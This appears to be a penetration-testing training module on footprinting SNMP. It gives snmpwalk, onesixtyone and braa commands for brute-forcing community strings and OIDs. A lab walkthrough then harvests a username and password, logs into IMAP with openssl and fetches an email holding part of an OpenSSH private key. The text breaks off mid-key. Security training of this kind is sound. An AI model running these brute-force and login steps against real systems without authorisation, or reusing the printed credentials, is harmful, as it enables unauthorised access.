`Simple Network Management Protocol` ([SNMP](https://datatracker.ietf.org/doc/html/rfc1157)) was created to monitor network devices. In addition, this protocol can also be used to handle configuration tasks and change settings remotely. In addition to the pure exchange of information, SNMP also transmits control commands using agents over UDP port `161`.
MIB is an independent format for storing device information. A MIB is a text file in which all queryable SNMP objects of a device are listed in a standardized tree hierarchy. It contains at least one `Object Identifier` (`OID`), which, in addition to the necessary unique address and a name, also provides information about the type, access rights, and a description of the respective object. MIB files are written in the `Abstract Syntax Notation One` (`ASN.1`).
An OID represents a node in a hierarchical namespace. A sequence of numbers uniquely identifies each node, allowing the node's position in the tree to be determined. The longer the chain, the more specific the information. 

## Footprinting the Service
For footprinting SNMP, we can use tools like `snmpwalk`, `onesixtyone`, and `braa`. `Snmpwalk` is used to query the OIDs with their information. `Onesixtyone` can be used to brute-force the names of the community strings since they can be named arbitrarily by the administrator.
#### SNMPwalk
```shell
snmpwalk -v2c -c public $target
```
If we do not know the community string, we can use `onesixtyone` and `SecLists` wordlists to identify these community strings.
#### OneSixtyOne
```shell
onesixtyone -c /usr/share/wordlists/seclists/Discovery/SNMP/snmp.txt $target
```
Once we know a community string, we can use it with [braa](https://github.com/mteg/braa) to brute-force the individual OIDs and enumerate the information behind them.
#### Braa
```shell
# Syntax - braa <community string>@<IP>:.1.3.6.*   
braa public@10.129.14.128:.1.3.6.*
```

# Footprinting Lab - Hard

Students need to utilize `onesixtyone` to bruteforce the names of the community string, to find it to be `backup`:
```shell
onesixtyone -c /usr/share/wordlists/seclists/Discovery/SNMP/snmp-onesixtyone.txt  10.129.202.20
```

With the attained community string, students need to use `Snmpwalk` to query the `OIDs` with their information, finding the credentials `tom:NMds732Js2761`:
```shell
snmpwalk -v2c -c backup STMIP
```
Thereafter, students need to connect to IMAP using openssl:

```shell
openssl s_client -connect STMIP:imaps

1337 login tom NMds732Js2761
1337 list "" *
1337 select "INBOX"
1337 fetch 1 (body[])
HELO dev.inlanefreight.htb
MAIL FROM:<tech@dev.inlanefreight.htb>
RCPT TO:<bob@inlanefreight.htb>
DATA
From: [Admin] <tech@inlanefreight.htb>
To: <tom@inlanefreight.htb>
Date: Wed, 10 Nov 2010 14:21:26 +0200
Subject: KEY

-----BEGIN OPENSSH PRIVATE KEY-----
b3BlbnNzaC1rZXktdjEAAAAABG5vbmUAAAAEbm9uZQAAAAAAAAABAAACFwAAAAdzc2gtcn
NhAAAAAwEAAQAAAgEA9snuYvJaB/QOnkaAs92nyBKypu73HMxyU9XWTS+UBbY3lVFH0t+F
+yuX+57Wo48pORqVAuMINrqxjxEPA7XMPR9XIsa60APplOSiQQqYreqEj6pjTj8wguR0Sd
hfKDOZwIQ1ILHecgJAA0zY2NwWmX5zVDDeIckjibxjrTvx7PHFdND3urVhelyuQ89BtJqB
abmrB5zzmaltTK0VuAxR/SFcVaTJNXd5Utw9SUk4/l0imjP3/ong1nlguuJGc1s47tqKBP
HuJKqn5r6am5xgX5k4ct7VQOQbRJwaiQVA5iShrwZxX5wBnZISazgCz/D6IdVMXilAUFKQ
```
